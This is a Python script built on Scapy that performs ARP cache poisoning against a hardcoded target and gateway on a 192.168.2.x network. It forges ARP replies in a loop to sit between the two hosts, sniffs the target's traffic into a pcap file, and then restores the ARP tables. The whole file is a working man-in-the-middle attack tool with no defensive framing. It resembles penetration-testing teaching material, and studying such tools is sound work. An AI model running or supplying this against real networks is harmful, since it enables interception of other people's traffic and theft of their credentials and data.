from scapy.all import *
import os
import sys
import threading
import signal

from scapy.layers.l2 import ARP, Ether

interface = "eth0"
target_ip = "192.168.2.216"
gateway_ip = "192.168.2.1"
packet_count = 1000
poisoning = True


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

    print("[*] APR poison attack finished.")

    return


# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print("[*] Setting up {}".format(interface))

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target {} is at {}".format(target_ip, target_mac))

# start poison thread
poison_thread = threading.Thread(target=poison_target,
                                 args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for {} packets".format(packet_count))

    bpf_filter = "ip host {}".format(target_ip)
    bpf_filter2 = "ip host 192.168.2.222"
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

except KeyboardInterrupt:
    pass

finally:
    # write out the captured packets
    print("[*] Writing packets to arper.pcap")
    wrpcap("arper.pcap", packets)

    # get the poison thread to stop
    poisoning = False

    # wait for poisoning thread to exit
    poison_thread.join()

    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
